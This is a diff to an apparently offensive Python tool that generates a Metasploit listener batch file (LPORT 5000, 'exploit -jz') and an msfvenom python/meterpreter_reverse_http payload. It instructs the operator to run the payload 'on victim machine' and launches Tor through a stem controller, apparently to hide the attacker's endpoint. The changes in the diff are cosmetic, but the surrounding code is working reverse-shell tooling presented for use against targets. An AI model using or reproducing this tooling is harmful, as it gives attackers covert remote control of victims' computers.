@@ -1,4 +1,6 @@
-# coding=utf-8
+# -*- coding: utf-8 -*-
+# Author: calfcrusher@inventati.org
+
 import os
 import shutil
 import signal
@@ -20,7 +22,7 @@ def generatebatch():
         f.write("set LPORT 5000\n")
         f.write("exploit -jz\n")
 
-    print(" * msfconsole.rc batch file generated in current directory")
+    print(" * msfconsole.rc batch file generated in " + os.getcwd())
     print('\n')
     # Asking for valid response
     while True:
@@ -35,7 +37,7 @@ def generatebatch():
 
 
 def generatepayload(hostname):
-    """Generating msfvenom python nostage payload"""
+    """Generating msfvenom python nostaged payload"""
 
     # Check if msfvenom is installed
     rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
@@ -50,7 +52,7 @@ def generatepayload(hostname):
     # Generate payload
     payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
     subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
-    print(" * payload.py generated in current directory. Run on victim machine")
+    print(" * payload.py generated in " + os.getcwd() + " - Run on victim machine")
 
 
 def stem():
@@ -68,7 +70,7 @@ def stem():
         os.system("tor --quiet &")
 
     # Give some time to start tor circuit..
-    time.sleep(5)
+    time.sleep(6)
 
     with Controller.from_port() as controller:
         controller.authenticate()
